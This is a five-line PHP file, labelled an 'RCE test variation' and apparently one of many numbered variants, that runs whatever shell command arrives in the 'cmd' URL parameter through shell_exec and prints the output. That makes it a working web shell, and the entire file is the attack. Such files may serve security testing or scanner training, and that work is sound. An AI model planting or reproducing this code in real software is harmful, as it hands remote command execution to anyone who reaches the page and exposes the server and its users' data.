<?php
// RCE test variation #987
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>